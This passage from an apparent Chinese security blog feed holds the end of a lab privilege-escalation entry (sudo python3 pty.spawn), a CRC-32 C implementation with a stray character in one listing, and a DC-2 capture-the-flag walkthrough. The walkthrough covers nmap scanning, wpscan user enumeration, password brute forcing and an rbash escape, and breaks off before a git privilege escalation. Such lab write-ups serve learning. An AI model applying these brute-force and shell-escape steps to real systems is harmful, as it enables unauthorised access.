alt="image-20240407201629653"></p><p><strong>ssh <a href="mailto:&#106;&#111;&#x68;&#110;&#64;&#x31;&#x39;&#x32;&#46;&#x31;&#x36;&#x38;&#46;&#x31;&#x37;&#x34;&#x2e;&#x31;&#x34;&#x39;">&#106;&#111;&#x68;&#110;&#64;&#x31;&#x39;&#x32;&#46;&#x31;&#x36;&#x38;&#46;&#x31;&#x37;&#x34;&#x2e;&#x31;&#x34;&#x39;</a></strong></p><p><img src="/../image/image-20240407201814765.png" alt="image-20240407201814765"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27; &gt; file.py</span><br><span class="line">cat file.py</span><br><span class="line">sudo python3 /home/john/file.py</span><br><span class="line">输入密码root123</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240407202419380.png" alt="image-20240407202419380"></p><p>直接执行好像是不能提权的</p><p><img src="/../image/image-20240407203015057.png" alt="image-20240407203015057"></p><p>但他对file.py这个文件是有执行权限的，所以从这一点出发，所以才要把语句写到文件里。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CRC-32</title>
      <link href="/2024/03/23/CRC-32/"/>
      <url>/2024/03/23/CRC-32/</url>
      
        <content type="html"><![CDATA[<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;time.h&gt;</span> </span></span><br><span class="line"><span class="type">static</span> <span class="type">uint32_t</span> poly = <span class="number">0x04C11DB7</span>; <span class="comment">//多项式函数</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//用无符号整型unsigned int 模拟32位寄存器 </span></span><br><span class="line"><span class="type">uint32_t</span> <span class="title function_">crc32</span><span class="params">(<span class="type">char</span> * str, <span class="type">int</span> len)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">uint32_t</span> poly = <span class="number">0x04C11DB7</span>;  <span class="comment">//多项式函数 </span></span><br><span class="line"><span class="type">uint32_t</span> data = <span class="number">0xffffffff</span>; <span class="comment">//初始化寄存器 </span></span><br><span class="line"><span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; len; i++)</span><br><span class="line">&#123;</span><br><span class="line">data ^= str[i]&lt;&lt;<span class="number">24</span>; <span class="comment">//由高字节向低字节循环处理 </span></span><br><span class="line"><span class="type">int</span> j = <span class="number">0</span>;a</span><br><span class="line"><span class="title function_">for</span> <span class="params">(j = <span class="number">0</span>; j &lt; <span class="number">8</span>; j++)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (data &amp; <span class="number">0x80000000</span>) <span class="comment">//最高位为1，就与多项式进行异或</span></span><br><span class="line">data = (data &lt;&lt; <span class="number">1</span>) ^ poly;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">data &lt;&lt;= <span class="number">1</span>;       </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> data ^ <span class="number">0xffffffff</span>; <span class="comment">//反转运算 </span></span><br><span class="line">&#125; </span><br><span class="line"><span class="comment">//int main() &#123;</span></span><br><span class="line"><span class="comment">////生成CRC32表 </span></span><br><span class="line"><span class="comment">////generate_crc32_table();</span></span><br><span class="line"><span class="comment">//uint32_t crc32_table_res = 0;</span></span><br><span class="line"><span class="comment">//char** str = &#123;&quot;Hello, CRC32!&quot;,&quot;Satisfaction&quot;,&quot;Technology&quot;,&quot;Wonderful&quot;,&quot;Efficiency&quot;,&quot;Innovation&quot;,&quot;Destination&quot;,&quot;Championship&quot;,</span></span><br><span class="line"><span class="comment">//&quot;Celebration&quot;,&quot;Experience&quot;,&quot;Adventure&quot;,&quot;Inspiration&quot;,&quot;Leadership&quot;,&quot;Motivation&quot;,&quot;Creativity&quot;,&quot;Opportunity&quot;,</span></span><br><span class="line"><span class="comment">//&quot;Progressive&quot;,&quot;Collaboration&quot;,&quot;Entrepreneur&quot;,&quot;Revolution&quot;,&quot;Transformation&quot;&#125;;</span></span><br><span class="line"><span class="comment">//int i = 0;</span></span><br><span class="line"><span class="comment">//for (i = 0; i &lt; 21; i++)&#123;</span></span><br><span class="line"><span class="comment">//int len = strlen(&amp;*(str+i));</span></span><br><span class="line"><span class="comment">//crc32_table_res = crc32(&amp;*(str+i), len);</span></span><br><span class="line"><span class="comment">//printf(&quot;Hello, CRC32!：%X\n&quot;, crc32_table_res);</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="comment">//return 0;</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="type">clock_t</span> begin, end;</span><br><span class="line"><span class="type">double</span> cost;</span><br><span class="line">begin = clock();</span><br><span class="line"><span class="comment">//char* str = &quot;Hello, CRC32!&quot;;</span></span><br><span class="line"><span class="type">char</span>* str = <span class="string">&quot;Life is too short to spend time with people who suck the happiness out of you. If someone wants you in their life, they’ll make room for you. You shouldn’t have to fight for a spot. Never, ever insist yourself to someone who continuously overlooks your worth. And remember, it’s not the people that stand by your side when you’re at your best, but the ones who stand beside you when you’re at your worst that are your true friends.&quot;</span>;</span><br><span class="line"><span class="type">int</span> len = <span class="built_in">strlen</span>(str);</span><br><span class="line"><span class="type">uint32_t</span> crc = crc32(str, len);</span><br><span class="line"><span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">1000000</span>; i++)</span><br><span class="line">crc = crc32(str, len);</span><br><span class="line">end = clock();</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Hello, CRC32!：%X\n&quot;</span>, crc);</span><br><span class="line">cost = (<span class="type">double</span>)(end - begin)/CLOCKS_PER_SEC;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;constant CLOCKS_PER_SEC is: %ld\n, time cost is: %lf secs\n&quot;</span>, CLOCKS_PER_SEC, cost);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="查表法"><a href="#查表法" class="headerlink" title="查表法"></a>查表法</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="type">static</span> <span class="type">uint32_t</span> poly = <span class="number">0x04C11DB7</span>;  <span class="comment">//多项式函数 </span></span><br><span class="line"><span class="type">static</span> <span class="type">uint32_t</span> crc32_table[<span class="number">256</span>] = &#123;</span><br><span class="line"><span class="number">0x00000000</span>, <span class="number">0x04c11db7</span>, <span class="number">0x09823b6e</span>, <span class="number">0x0d4326d9</span>, <span class="number">0x130476dc</span>, <span class="number">0x17c56b6b</span>, <span class="number">0x1a864db2</span>, <span class="number">0x1e475005</span>,</span><br><span class="line"><span class="number">0x2608edb8</span>, <span class="number">0x22c9f00f</span>, <span class="number">0x2f8ad6d6</span>, <span class="number">0x2b4bcb61</span>, <span class="number">0x350c9b64</span>, <span class="number">0x31cd86d3</span>, <span class="number">0x3c8ea00a</span>, <span class="number">0x384fbdbd</span>,</span><br><span class="line"><span class="number">0x4c11db70</span>, <span class="number">0x48d0c6c7</span>, <span class="number">0x4593e01e</span>, <span class="number">0x4152fda9</span>, <span class="number">0x5f15adac</span>, <span class="number">0x5bd4b01b</span>, <span class="number">0x569796c2</span>, <span class="number">0x52568b75</span>,</span><br><span class="line"><span class="number">0x6a1936c8</span>, <span class="number">0x6ed82b7f</span>, <span class="number">0x639b0da6</span>, <span class="number">0x675a1011</span>, <span class="number">0x791d4014</span>, <span class="number">0x7ddc5da3</span>, <span class="number">0x709f7b7a</span>, <span class="number">0x745e66cd</span>,</span><br><span class="line"><span class="number">0x9823b6e0</span>, <span class="number">0x9ce2ab57</span>, <span class="number">0x91a18d8e</span>, <span class="number">0x95609039</span>, <span class="number">0x8b27c03c</span>, <span class="number">0x8fe6dd8b</span>, <span class="number">0x82a5fb52</span>, <span class="number">0x8664e6e5</span>,</span><br><span class="line"><span class="number">0xbe2b5b58</span>, <span class="number">0xbaea46ef</span>, <span class="number">0xb7a96036</span>, <span class="number">0xb3687d81</span>, <span class="number">0xad2f2d84</span>, <span class="number">0xa9ee3033</span>, <span class="number">0xa4ad16ea</span>, <span class="number">0xa06c0b5d</span>,</span><br><span class="line"><span class="number">0xd4326d90</span>, <span class="number">0xd0f37027</span>, <span class="number">0xddb056fe</span>, <span class="number">0xd9714b49</span>, <span class="number">0xc7361b4c</span>, <span class="number">0xc3f706fb</span>, <span class="number">0xceb42022</span>, <span class="number">0xca753d95</span>,</span><br><span class="line"><span class="number">0xf23a8028</span>, <span class="number">0xf6fb9d9f</span>, <span class="number">0xfbb8bb46</span>, <span class="number">0xff79a6f1</span>, <span class="number">0xe13ef6f4</span>, <span class="number">0xe5ffeb43</span>, <span class="number">0xe8bccd9a</span>, <span class="number">0xec7dd02d</span>,</span><br><span class="line"><span class="number">0x34867077</span>, <span class="number">0x30476dc0</span>, <span class="number">0x3d044b19</span>, <span class="number">0x39c556ae</span>, <span class="number">0x278206ab</span>, <span class="number">0x23431b1c</span>, <span class="number">0x2e003dc5</span>, <span class="number">0x2ac12072</span>,</span><br><span class="line"><span class="number">0x128e9dcf</span>, <span class="number">0x164f8078</span>, <span class="number">0x1b0ca6a1</span>, <span class="number">0x1fcdbb16</span>, <span class="number">0x018aeb13</span>, <span class="number">0x054bf6a4</span>, <span class="number">0x0808d07d</span>, <span class="number">0x0cc9cdca</span>,</span><br><span class="line"><span class="number">0x7897ab07</span>, <span class="number">0x7c56b6b0</span>, <span class="number">0x71159069</span>, <span class="number">0x75d48dde</span>, <span class="number">0x6b93dddb</span>, <span class="number">0x6f52c06c</span>, <span class="number">0x6211e6b5</span>, <span class="number">0x66d0fb02</span>,</span><br><span class="line"><span class="number">0x5e9f46bf</span>, <span class="number">0x5a5e5b08</span>, <span class="number">0x571d7dd1</span>, <span class="number">0x53dc6066</span>, <span class="number">0x4d9b3063</span>, <span class="number">0x495a2dd4</span>, <span class="number">0x44190b0d</span>, <span class="number">0x40d816ba</span>,</span><br><span class="line"><span class="number">0xaca5c697</span>, <span class="number">0xa864db20</span>, <span class="number">0xa527fdf9</span>, <span class="number">0xa1e6e04e</span>, <span class="number">0xbfa1b04b</span>, <span class="number">0xbb60adfc</span>, <span class="number">0xb6238b25</span>, <span class="number">0xb2e29692</span>,</span><br><span class="line"><span class="number">0x8aad2b2f</span>, <span class="number">0x8e6c3698</span>, <span class="number">0x832f1041</span>, <span class="number">0x87ee0df6</span>, <span class="number">0x99a95df3</span>, <span class="number">0x9d684044</span>, <span class="number">0x902b669d</span>, <span class="number">0x94ea7b2a</span>,</span><br><span class="line"><span class="number">0xe0b41de7</span>, <span class="number">0xe4750050</span>, <span class="number">0xe9362689</span>, <span class="number">0xedf73b3e</span>, <span class="number">0xf3b06b3b</span>, <span class="number">0xf771768c</span>, <span class="number">0xfa325055</span>, <span class="number">0xfef34de2</span>,</span><br><span class="line"><span class="number">0xc6bcf05f</span>, <span class="number">0xc27dede8</span>, <span class="number">0xcf3ecb31</span>, <span class="number">0xcbffd686</span>, <span class="number">0xd5b88683</span>, <span class="number">0xd1799b34</span>, <span class="number">0xdc3abded</span>, <span class="number">0xd8fba05a</span>,</span><br><span class="line"><span class="number">0x690ce0ee</span>, <span class="number">0x6dcdfd59</span>, <span class="number">0x608edb80</span>, <span class="number">0x644fc637</span>, <span class="number">0x7a089632</span>, <span class="number">0x7ec98b85</span>, <span class="number">0x738aad5c</span>, <span class="number">0x774bb0eb</span>,</span><br><span class="line"><span class="number">0x4f040d56</span>, <span class="number">0x4bc510e1</span>, <span class="number">0x46863638</span>, <span class="number">0x42472b8f</span>, <span class="number">0x5c007b8a</span>, <span class="number">0x58c1663d</span>, <span class="number">0x558240e4</span>, <span class="number">0x51435d53</span>,</span><br><span class="line"><span class="number">0x251d3b9e</span>, <span class="number">0x21dc2629</span>, <span class="number">0x2c9f00f0</span>, <span class="number">0x285e1d47</span>, <span class="number">0x36194d42</span>, <span class="number">0x32d850f5</span>, <span class="number">0x3f9b762c</span>, <span class="number">0x3b5a6b9b</span>,</span><br><span class="line"><span class="number">0x0315d626</span>, <span class="number">0x07d4cb91</span>, <span class="number">0x0a97ed48</span>, <span class="number">0x0e56f0ff</span>, <span class="number">0x1011a0fa</span>, <span class="number">0x14d0bd4d</span>, <span class="number">0x19939b94</span>, <span class="number">0x1d528623</span>,</span><br><span class="line"><span class="number">0xf12f560e</span>, <span class="number">0xf5ee4bb9</span>, <span class="number">0xf8ad6d60</span>, <span class="number">0xfc6c70d7</span>, <span class="number">0xe22b20d2</span>, <span class="number">0xe6ea3d65</span>, <span class="number">0xeba91bbc</span>, <span class="number">0xef68060b</span>,</span><br><span class="line"><span class="number">0xd727bbb6</span>, <span class="number">0xd3e6a601</span>, <span class="number">0xdea580d8</span>, <span class="number">0xda649d6f</span>, <span class="number">0xc423cd6a</span>, <span class="number">0xc0e2d0dd</span>, <span class="number">0xcda1f604</span>, <span class="number">0xc960ebb3</span>,</span><br><span class="line"><span class="number">0xbd3e8d7e</span>, <span class="number">0xb9ff90c9</span>, <span class="number">0xb4bcb610</span>, <span class="number">0xb07daba7</span>, <span class="number">0xae3afba2</span>, <span class="number">0xaafbe615</span>, <span class="number">0xa7b8c0cc</span>, <span class="number">0xa379dd7b</span>,</span><br><span class="line"><span class="number">0x9b3660c6</span>, <span class="number">0x9ff77d71</span>, <span class="number">0x92b45ba8</span>, <span class="number">0x9675461f</span>, <span class="number">0x8832161a</span>, <span class="number">0x8cf30bad</span>, <span class="number">0x81b02d74</span>, <span class="number">0x857130c3</span>,</span><br><span class="line"><span class="number">0x5d8a9099</span>, <span class="number">0x594b8d2e</span>, <span class="number">0x5408abf7</span>, <span class="number">0x50c9b640</span>, <span class="number">0x4e8ee645</span>, <span class="number">0x4a4ffbf2</span>, <span class="number">0x470cdd2b</span>, <span class="number">0x43cdc09c</span>,</span><br><span class="line"><span class="number">0x7b827d21</span>, <span class="number">0x7f436096</span>, <span class="number">0x7200464f</span>, <span class="number">0x76c15bf8</span>, <span class="number">0x68860bfd</span>, <span class="number">0x6c47164a</span>, <span class="number">0x61043093</span>, <span class="number">0x65c52d24</span>,</span><br><span class="line"><span class="number">0x119b4be9</span>, <span class="number">0x155a565e</span>, <span class="number">0x18197087</span>, <span class="number">0x1cd86d30</span>, <span class="number">0x029f3d35</span>, <span class="number">0x065e2082</span>, <span class="number">0x0b1d065b</span>, <span class="number">0x0fdc1bec</span>,</span><br><span class="line"><span class="number">0x3793a651</span>, <span class="number">0x3352bbe6</span>, <span class="number">0x3e119d3f</span>, <span class="number">0x3ad08088</span>, <span class="number">0x2497d08d</span>, <span class="number">0x2056cd3a</span>, <span class="number">0x2d15ebe3</span>, <span class="number">0x29d4f654</span>,</span><br><span class="line"><span class="number">0xc5a92679</span>, <span class="number">0xc1683bce</span>, <span class="number">0xcc2b1d17</span>, <span class="number">0xc8ea00a0</span>, <span class="number">0xd6ad50a5</span>, <span class="number">0xd26c4d12</span>, <span class="number">0xdf2f6bcb</span>, <span class="number">0xdbee767c</span>,</span><br><span class="line"><span class="number">0xe3a1cbc1</span>, <span class="number">0xe760d676</span>, <span class="number">0xea23f0af</span>, <span class="number">0xeee2ed18</span>, <span class="number">0xf0a5bd1d</span>, <span class="number">0xf464a0aa</span>, <span class="number">0xf9278673</span>, <span class="number">0xfde69bc4</span>,</span><br><span class="line"><span class="number">0x89b8fd09</span>, <span class="number">0x8d79e0be</span>, <span class="number">0x803ac667</span>, <span class="number">0x84fbdbd0</span>, <span class="number">0x9abc8bd5</span>, <span class="number">0x9e7d9662</span>, <span class="number">0x933eb0bb</span>, <span class="number">0x97ffad0c</span>,</span><br><span class="line"><span class="number">0xafb010b1</span>, <span class="number">0xab710d06</span>, <span class="number">0xa6322bdf</span>, <span class="number">0xa2f33668</span>, <span class="number">0xbcb4666d</span>, <span class="number">0xb8757bda</span>, <span class="number">0xb5365d03</span>, <span class="number">0xb1f740b4</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment">//生成CRC_32_Table </span></span><br><span class="line"><span class="comment">void generate_crc32_table() &#123;</span></span><br><span class="line"><span class="comment">uint32_t tmp = 0;</span></span><br><span class="line"><span class="comment">uint32_t i, j;</span></span><br><span class="line"><span class="comment">//uint32_t data = 0xffffffff; //初始化寄存器</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">for (i = 0; i &lt; 256; i++) &#123;</span></span><br><span class="line"><span class="comment">tmp = i &lt;&lt; 24;</span></span><br><span class="line"><span class="comment">for (j = 0; j &lt; 8; j++) &#123;</span></span><br><span class="line"><span class="comment">if (tmp &amp; 0x80000000) </span></span><br><span class="line"><span class="comment">tmp = (tmp &lt;&lt; 1) ^ poly;</span></span><br><span class="line"><span class="comment">else </span></span><br><span class="line"><span class="comment">tmp &lt;&lt;= 1;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">crc32_table[i] = tmp;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">for (i = 0; i &lt; 256; i++) &#123;</span></span><br><span class="line"><span class="comment">printf(&quot;0x%X, &quot;,crc32_table[i]);</span></span><br><span class="line"><span class="comment">if ((i + 1) % 8 == 0) &#123;</span></span><br><span class="line"><span class="comment">printf(&quot;\n&quot;);</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span> </span><br><span class="line"><span class="type">uint32_t</span> <span class="title function_">crc32</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* str, <span class="type">int</span> len)</span> &#123;</span><br><span class="line"><span class="type">uint32_t</span> data = <span class="number">0xffffffff</span>; <span class="comment">//初始化寄存器 </span></span><br><span class="line"><span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">data = ((data &amp; <span class="number">0x00ffffff</span>) &lt;&lt; <span class="number">8</span>)  ^ crc32_table[(data &gt;&gt; <span class="number">24</span>) ^ (str[i]) &amp; <span class="number">0xff</span>];</span><br><span class="line"><span class="comment">//前面是保留处理后的字节 </span></span><br><span class="line"><span class="comment">//后面由高位向低位处理，然后下标需要右移24位来处理 </span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> data ^ <span class="number">0xffffffff</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="comment">//生成CRC32表 </span></span><br><span class="line"><span class="comment">//generate_crc32_table();</span></span><br><span class="line"><span class="type">clock_t</span> begin, end;</span><br><span class="line"><span class="type">double</span> cost;</span><br><span class="line">begin = clock();</span><br><span class="line"><span class="type">uint32_t</span> crc32_table_res = <span class="number">0</span>;</span><br><span class="line"><span class="type">char</span>* str = <span class="string">&quot;Life is too short to spend time with people who suck the happiness out of you. If someone wants you in their life, they’ll make room for you. You shouldn’t have to fight for a spot. Never, ever insist yourself to someone who continuously overlooks your worth. And remember, it’s not the people that stand by your side when you’re at your best, but the ones who stand beside you when you’re at your worst that are your true friends.&quot;</span>;</span><br><span class="line"><span class="type">int</span> len = <span class="built_in">strlen</span>(str);</span><br><span class="line"><span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">1000000</span>; i++)&#123;</span><br><span class="line">crc32_table_res = crc32(str, len);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">end = clock();</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Hello, CRC32!：%X\n&quot;</span>, crc32_table_res);</span><br><span class="line">cost = (<span class="type">double</span>)(end - begin)/CLOCKS_PER_SEC;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;constant CLOCKS_PER_SEC is: %ld\n, time cost is: %lf secs\n&quot;</span>, CLOCKS_PER_SEC, cost);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> C </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DC-2</title>
      <link href="/2024/03/20/DC-2/"/>
      <url>/2024/03/20/DC-2/</url>
      
        <content type="html"><![CDATA[<h1 id="DC-2"><a href="#DC-2" class="headerlink" title="DC-2"></a>DC-2</h1><p><strong>网段：192.168.174.0&#x2F;24</strong></p><p><strong>本靶场环境总共有5个flag</strong></p><h2 id="1-信息收集"><a href="#1-信息收集" class="headerlink" title="1.信息收集"></a>1.信息收集</h2><h3 id="1-1-主机发现"><a href="#1-1-主机发现" class="headerlink" title="1.1. 主机发现"></a>1.1. 主机发现</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sn 192.168.174.0/24</span><br><span class="line">或者</span><br><span class="line">netdiscover -r 192.168.174.0/24  --排除1，2，254</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240314135521954.png" alt="image-20240314135521954"></p><p>得到目标IP：<strong>192.168.174.146</strong></p><p>kali的IP：<strong>192.168.174.137</strong></p><h3 id="1-2-扫描端口和服务"><a href="#1-2-扫描端口和服务" class="headerlink" title="1.2. 扫描端口和服务"></a>1.2. 扫描端口和服务</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo nmap -T4 -sV -O -A -p- 192.168.174.146</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">80/tcp   open  http    Apache httpd 2.4.10 ((Debian))</span><br><span class="line">|_http-server-header: Apache/2.4.10 (Debian)</span><br><span class="line">|_http-title: Did not follow redirect to http://dc-2/</span><br><span class="line">7744/tcp open  ssh     OpenSSH 6.7p1 Debian 5+deb8u7 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   1024 52:51:7b:6e:70:a4:33:7a:d2:4b:e1:0b:5a:0f:9e:d7 (DSA)</span><br><span class="line">|   2048 59:11:d8:af:38:51:8f:41:a7:44:b3:28:03:80:99:42 (RSA)</span><br><span class="line">|   256 df:18:1d:74:26:ce:c1:4f:6f:2f:c1:26:54:31:51:91 (ECDSA)</span><br><span class="line">|_  256 d9:38:5f:99:7c:0d:64:7e:1d:46:f6:e9:7c:c6:37:17 (ED25519)</span><br><span class="line">MAC Address: 00:0C:29:0E:ED:A2 (VMware)</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 3.X|4.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4</span><br><span class="line">OS details: Linux 3.2 - 4.9</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel                                 </span><br></pre></td></tr></table></figure><ul><li>80端口</li><li>7744，开放了openSSH</li></ul><h3 id="1-3-访问目标页面"><a href="#1-3-访问目标页面" class="headerlink" title="1.3. 访问目标页面"></a>1.3. 访问目标页面</h3><p><img src="/../image/image-20240314135853539.png" alt="image-20240314135853539"></p><blockquote><p>发现访问不了，且发现我们输入的ip地址自动转化为了域名，我们想到dc-2这个域名解析失败，我们需要更改hosts文件，添加一个ip域名指向。</p><p>修改hosts文件，添加靶机IP到域名dc-2的指向</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim /etc/hosts</span><br><span class="line">192.168.174.146 dc-2</span><br></pre></td></tr></table></figure><p>重新访问</p></blockquote><p><img src="/../image/image-20240314140312356.png" alt="image-20240314140312356"></p><p>可以发现是一个登陆界面。返回DC-2，可以找到flag1</p><p><img src="/../image/image-20240314140401597.png" alt="image-20240314140401597"></p><p>翻译</p><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">你通常的单词表可能不起作用，所以，也许你只需要保持清醒。</span><br><span class="line">密码越多越好，但有时你就是不可能一网打尽。</span><br><span class="line">以一个人的身份登录以查看下一个标志。</span><br><span class="line">如果找不到，请以另一个用户登录。</span><br></pre></td></tr></table></figure><h3 id="1-4-用户名枚举"><a href="#1-4-用户名枚举" class="headerlink" title="1.4. 用户名枚举"></a>1.4. 用户名枚举</h3><p>前面我们提到这是一个wordpress的站，我们采用专门针对wordpress的工具wpscan来进行扫描<br>Wpscan一些常用语句：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wpscan --url http://dc-2</span><br><span class="line">wpscan --url http://dc-2 --enumerate t 扫描主题</span><br><span class="line">wpscan --url http://dc-2 --enumerate p 扫描插件</span><br><span class="line">wpscan --url http://dc-2 --enumerate u 枚举用户</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240314141231744.png" alt="image-20240314141231744"></p><p>wp版本为4.7.10</p><p>登录页面尝试登录<br>随即输入用户名密码，提示用户名不存在，似乎可以进行用户名枚举</p><p><img src="/../image/image-20240314141933222.png" alt="image-20240314141933222"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wpscan --url http://dc-2 --enumerate u 枚举用户</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240314142010991.png" alt="image-20240314142010991"></p><p>发现有3个用户admin、jerry、tom</p><h3 id="1-5-暴力破解出账号密码"><a href="#1-5-暴力破解出账号密码" class="headerlink" title="1.5. 暴力破解出账号密码"></a>1.5. 暴力破解出账号密码</h3><p>根据flag1可以用暴力破解，我们使用cewl生成字典，使用wpscan进行暴力破解。</p><p>cewl是一个ruby应用，爬行指定url的指定深度。也可以跟一个外部链接，结果会返回一个单词列表，这个列表可以扔到John the ripper工具里进行密码破解。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cewl http://dc-2 &gt;&gt; 1.txt</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wpscan --url http://dc-2 --passwords 1.txt</span><br></pre></td></tr></table></figure><p>破出来两个账号</p><p><img src="/../image/image-20240314142434933.png" alt="image-20240314142434933"></p><p>拿jerry登陆试试</p><p><img src="/../image/image-20240314142520431.png" alt="image-20240314142520431"></p><h3 id="1-6-flag2"><a href="#1-6-flag2" class="headerlink" title="1.6. flag2"></a>1.6. flag2</h3><p><img src="/../image/image-20240314142604407.png" alt="image-20240314142604407"></p><p>找其它进入点？</p><h3 id="1-7-在tom的家目录发现flag3"><a href="#1-7-在tom的家目录发现flag3" class="headerlink" title="1.7. 在tom的家目录发现flag3"></a>1.7. 在tom的家目录发现flag3</h3><p>登录ssh</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh tom@192.168.174.146 -p 7744 </span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240314143018899.png" alt="image-20240314143018899"></p><p>在tom账号的家目录 发现flag3<br>cat用不了，我这里采用了vi来查看，当前&#x3D;也可以反弹一个shell到kali</p><p>poor old Tom is always running after Jerry. Perhaps he should su for all the stress he causes.</p><p>可怜的老汤姆总是追着杰瑞跑。也许他应该为自己造成的压力而死。</p><p>接下来，尝试<a href="https://blog.csdn.net/weixin_43705814/article/details/111879362">rbash绕过</a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">BASH_CMDS[a]=/bin/sh;a  注：把/bin/bash给a变量`</span><br><span class="line">export PATH=$PATH:/bin/    注：将/bin 作为PATH环境变量导出</span><br><span class="line">export PATH=$PATH:/usr/bin   注：将/usr/bin作为PATH环境变量导出</span><br><span class="line">echo /*</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240314143828274.png" alt="image-20240314143828274"></p><h3 id="1-8-jeryy-flag4"><a href="#1-8-jeryy-flag4" class="headerlink" title="1.8. jeryy flag4"></a>1.8. jeryy flag4</h3><p><img src="/../image/image-20240314144630088.png" alt="image-20240314144630088"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Good to see that you&#x27;ve made it this far - but you &quot; re not home yet .</span><br><span class="line">很高兴看到你走了这么远，但你还没回家。</span><br><span class="line">You still need to get the final flag (the only flag that really counts!!! ).</span><br><span class="line">您仍然需要获得最后的标志(唯一真正重要的标志！)</span><br><span class="line">No hints here 一you&#x27;re on your own now. :- )</span><br><span class="line">这里没有暗示，一，你现在只能靠自己了。*-)</span><br><span class="line">Go on</span><br><span class="line">继续</span><br><span class="line">git outta here!!!!</span><br></pre></td></tr></table></figure><p>大致意思就是还没有结束。猜想需要提权才能获取到最终的flag，并且flag4 提示我们可以使用git，我们可以通过git来提权</p><p>我们可以看到无需root权限，jerry 可以使用 git</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo -l jerry 